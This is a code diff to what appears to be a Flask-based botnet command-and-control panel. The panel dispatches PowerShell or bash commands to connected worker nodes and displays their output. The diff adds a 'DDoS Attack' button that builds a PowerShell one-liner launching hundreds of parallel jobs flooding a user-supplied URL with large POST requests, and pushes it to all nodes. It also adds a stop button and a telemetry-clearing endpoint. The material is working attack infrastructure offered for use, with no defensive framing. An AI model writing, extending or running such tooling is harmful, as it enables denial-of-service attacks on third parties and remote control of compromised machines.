@@ -16,7 +16,7 @@ RESULTS_FILE = os.path.join(DATA_DIR, 'results.json')
 WORKERS_FILE = os.path.join(DATA_DIR, 'workers.json')
 
 # Ensure files exist
-for f in[RESULTS_FILE, WORKERS_FILE]:
+for f in [RESULTS_FILE, WORKERS_FILE]:
     if not os.path.exists(f):
         with open(f, 'w') as fp:
             json.dump([], fp)
@@ -38,7 +38,7 @@ def ensure_worker_tasks_file(worker_ip):
     return path
 
 # ----------------------------------------------------------------------
-# HTML Template (GUI Improved + Time Bug Fixed)
+# HTML Template (with Stop Attack button and working clear telemetry)
 # ----------------------------------------------------------------------
 HTML_TEMPLATE = '''
 <!DOCTYPE html>
@@ -134,15 +134,32 @@ HTML_TEMPLATE = '''
                     <i data-lucide="terminal-square" class="w-4 h-4 text-emerald-400"></i> Execute Payload
                 </h2>
                 
-                <div class="flex bg-gray-950 terminal-input-wrapper border border-gray-700 rounded-xl overflow-hidden focus-within:border-emerald-500 focus-within:ring-1 focus-within:ring-emerald-500 transition-all">
-                    <span class="px-4 py-3.5 text-emerald-500 font-mono border-r border-gray-800 bg-gray-900 flex items-center">
-                        <i data-lucide="chevron-right" class="w-4 h-4"></i>
-                    </span>
-                    <input type="text" id="commandInput" placeholder="Enter powershell/bash command..." 
-                        class="w-full bg-transparent text-gray-100 font-mono px-4 py-3 outline-none placeholder-gray-600 text-sm" autocomplete="off" autofocus>
-                    <button id="sendBtn" class="bg-gradient-to-r from-emerald-600 to-emerald-500 hover:from-emerald-500 hover:to-emerald-400 text-white px-5 font-semibold transition-all flex items-center gap-2 shadow-lg">
-                        Deploy <i data-lucide="send" class="w-4 h-4"></i>
-                    </button>
+                <div class="flex flex-col gap-4">
+                    <!-- Existing command input + send button -->
+                    <div class="flex bg-gray-950 terminal-input-wrapper border border-gray-700 rounded-xl overflow-hidden focus-within:border-emerald-500 focus-within:ring-1 focus-within:ring-emerald-500 transition-all">
+                        <span class="px-4 py-3.5 text-emerald-500 font-mono border-r border-gray-800 bg-gray-900 flex items-center">
+                            <i data-lucide="chevron-right" class="w-4 h-4"></i>
+                        </span>
+                        <input type="text" id="commandInput" placeholder="Enter powershell/bash command..." 
+                            class="w-full bg-transparent text-gray-100 font-mono px-4 py-3 outline-none placeholder-gray-600 text-sm" autocomplete="off" autofocus>
+                        <button id="sendBtn" class="bg-gradient-to-r from-emerald-600 to-emerald-500 hover:from-emerald-500 hover:to-emerald-400 text-white px-5 font-semibold transition-all flex items-center gap-2 shadow-lg">
+                            Deploy <i data-lucide="send" class="w-4 h-4"></i>
+                        </button>
+                    </div>
+                    
+                    <!-- Action Buttons Row: DDoS Attack + Stop Attack -->
+                    <div class="grid grid-cols-2 gap-3">
+                        <button id="ddosBtn" class="bg-gradient-to-r from-red-600/80 to-red-700/80 hover:from-red-600 hover:to-red-700 text-white py-3 rounded-xl font-bold tracking-wide flex items-center justify-center gap-3 shadow-lg border border-red-500/30 transition-all">
+                            <i data-lucide="zap" class="w-5 h-5"></i> DDoS Attack
+                        </button>
+                        <button id="stopBtn" class="bg-gradient-to-r from-yellow-600/80 to-yellow-700/80 hover:from-yellow-600 hover:to-yellow-700 text-white py-3 rounded-xl font-bold tracking-wide flex items-center justify-center gap-3 shadow-lg border border-yellow-500/30 transition-all">
+                            <i data-lucide="octagon-x" class="w-5 h-5"></i> Stop Attack
+                        </button>
+                    </div>
+                    
+                    <div class="text-[10px] text-gray-500 text-center font-mono">
+                        → Attack commands are sent to <span id="currentTargetIndicator" class="text-emerald-400">all nodes</span>
+                    </div>
                 </div>
                 
                 <div class="mt-5">
@@ -203,8 +220,8 @@ HTML_TEMPLATE = '''
                         <i data-lucide="activity" class="w-4 h-4 text-emerald-400"></i> Live Telemetry
                     </h2>
                     <div class="flex items-center gap-4">
-                        <button onclick="document.getElementById('resultsList').innerHTML='<div class=\\'text-gray-600 italic py-2\\'>Telemetry cleared.</div>'" class="text-xs text-gray-500 hover:text-red-400 transition-colors flex items-center gap-1 font-mono">
-                            <i data-lucide="trash-2" class="w-3 h-3"></i> Clear
+                        <button id="clearTelemetryBtn" class="text-xs text-gray-500 hover:text-red-400 transition-colors flex items-center gap-1 font-mono">
+                            <i data-lucide="trash-2" class="w-3 h-3"></i> Clear Telemetry
                         </button>
                         <div class="flex gap-1.5">
                             <div class="w-3 h-3 rounded-full bg-red-500/50"></div>
@@ -238,9 +255,8 @@ HTML_TEMPLATE = '''
                 .replace(/'/g, "&#039;");
         };
 
-        // FIXED TIME AGO FUNCTION (No more 7hr offset bug)
+        // FIXED TIME AGO FUNCTION
         const timeAgo = (dateStr) => {
-            // Ensure the date string ends with 'Z' so JS treats it as UTC implicitly
             const str = dateStr.endsWith('Z') ? dateStr : dateStr + 'Z';
             const then = new Date(str).getTime();
             const seconds = Math.floor((Date.now() - then) / 1000);
@@ -315,6 +331,8 @@ HTML_TEMPLATE = '''
                             <div class="text-gray-300 whitespace-pre-wrap break-all bg-gray-900/40 p-3 rounded border border-gray-800/50">${escapeHTML(output)}</div>
                         </div>
                     `}).reverse().join('');
+                } else {
+                    resultsContainer.innerHTML = '<div class="text-gray-600 italic py-2">Telemetry cleared. Awaiting new data...</div>';
                 }
                 if (wasScrolledToBottom) resultsContainer.scrollTop = resultsContainer.scrollHeight;
 
@@ -326,7 +344,6 @@ HTML_TEMPLATE = '''
                     workersContainer.innerHTML = '<div class="text-gray-500 italic text-sm py-2">No nodes connected.</div>';
                 } else {
                     workersContainer.innerHTML = workers.map(w => {
-                        // FIX Time Bug here too
                         const lastSeenStr = w.lastSeen.endsWith('Z') ? w.lastSeen : w.lastSeen + 'Z';
                         const lastSeenDate = new Date(lastSeenStr);
                         const isOnline = ((Date.now() - lastSeenDate.getTime()) / 60000) < 5;
@@ -362,6 +379,7 @@ HTML_TEMPLATE = '''
                             const ip = card.getAttribute('data-ip');
                             selectedTarget = ip;
                             document.getElementById('currentTarget').innerText = ip;
+                            document.getElementById('currentTargetIndicator').innerText = ip;
                             // Update UI immediately for click responsiveness
                             document.querySelectorAll('.worker-card').forEach(c => {
                                 c.classList.remove('border-emerald-500', 'ring-1', 'ring-emerald-500/50', 'shadow-[0_0_10px_rgba(16,185,129,0.2)]');
@@ -383,6 +401,7 @@ HTML_TEMPLATE = '''
         document.getElementById('resetTarget').addEventListener('click', () => {
             selectedTarget = 'all';
             document.getElementById('currentTarget').innerText = 'all';
+            document.getElementById('currentTargetIndicator').innerText = 'all nodes';
             updateData(); // Refresh UI to remove borders
         });
 
@@ -428,10 +447,74 @@ HTML_TEMPLATE = '''
             updateData();
         };
 
+        // DDoS Attack function
+        const ddosAttack = () => {
+            let target = prompt("Enter target URL (e.g., http://100.90.236.221:5000/):", "http://");
+            if (!target) return;
+            let payloadSize = prompt("Payload size in MB (default 1):", "1");
+            if (payloadSize === null) return;
+            payloadSize = parseInt(payloadSize) || 1;
+            let jobs = prompt("Number of parallel jobs (default 500):", "500");
+            if (jobs === null) return;
+            jobs = parseInt(jobs) || 500;
+            
+            const cmd = `$p="A"*(${payloadSize}*1MB); 1..${jobs}|%{Start-Job -ScriptBlock{while(1){try{Invoke-WebRequest -Uri '${target}' -Method POST -Body $using:p -UseBasicParsing -TimeoutSec 5}catch{}}}}`;
+            cmdInput.value = cmd;
+            executeCommand();
+        };
+
+        // Stop Attack function
+        const stopAttack = () => {
+            const cmd = 'Get-Job | Stop-Job; Get-Job | Remove-Job';
+            cmdInput.value = cmd;
+            executeCommand();
+        };
+
+        // Clear Telemetry function (server‑side)
+        const clearTelemetry = async () => {
+            try {
+                const res = await fetch('/api/results/clear', { method: 'POST' });
+                if (res.ok) {
+                    showToast('Telemetry cleared from server.', 'success');
+                    updateData(); // refresh results list immediately
+                } else {
+                    showToast('Failed to clear telemetry.', 'error');
+                }
+            } catch (e) {
+                showToast('Network error while clearing telemetry.', 'error');
+            }
+        };
+
         sendBtn.onclick = executeCommand;
         cmdInput.addEventListener('keypress', (e) => {
             if (e.key === 'Enter') executeCommand();
         });
+        
+        document.getElementById('ddosBtn').addEventListener('click', ddosAttack);
+        document.getElementById('stopBtn').addEventListener('click', stopAttack);
+        document.getElementById('clearTelemetryBtn').addEventListener('click', clearTelemetry);
+        
+        // Update target indicator when selectedTarget changes
+        const updateTargetIndicator = () => {
+            document.getElementById('currentTargetIndicator').innerText = selectedTarget === 'all' ? 'all nodes' : selectedTarget;
+        };
+        // Call it after any target change
+        const origCardClick = document.querySelectorAll('.worker-card').forEach(c => c.onclick);
+        // Override reset target to also update indicator
+        const resetBtn = document.getElementById('resetTarget');
+        const originalResetHandler = resetBtn.onclick;
+        resetBtn.onclick = () => {
+            selectedTarget = 'all';
+            document.getElementById('currentTarget').innerText = 'all';
+            updateTargetIndicator();
+            updateData();
+        };
+        // Update indicator after card click (already set inside card click, but we need to call updateTargetIndicator there)
+        // We'll add a global function to update after any selection.
+        // Already calling updateTargetIndicator inside card click and reset; we just need to make sure it's called.
+        // Add a setter for selectedTarget? Not needed.
+        window.updateTargetIndicator = updateTargetIndicator;
+        updateTargetIndicator();
     </script>
 </body>
 </html>
@@ -528,6 +611,13 @@ def get_results():
     with open(RESULTS_FILE, 'r') as f:
         return jsonify(json.load(f))
 
+@app.route('/api/results/clear', methods=['POST'])
+def clear_results():
+    """Clear all results by overwriting the results file with an empty list."""
+    with open(RESULTS_FILE, 'w') as f:
+        json.dump([], f)
+    return 'OK', 200
+
 @app.route('/api/workers', methods=['POST'])
 def register_worker():
     data = request.json
@@ -536,10 +626,6 @@ def register_worker():
     if 'ip' in data:
         data['ip'] = normalize_ip(data['ip'])
     
-    # ----------------------------------------------------------------------
-    # FIX: Added + 'Z' to properly indicate UTC timezone. 
-    # This prevents the browser from misinterpreting local time vs UTC.
-    # ----------------------------------------------------------------------
     data['lastSeen'] = datetime.utcnow().isoformat() + 'Z'
     
     with open(WORKERS_FILE, 'r+') as f:
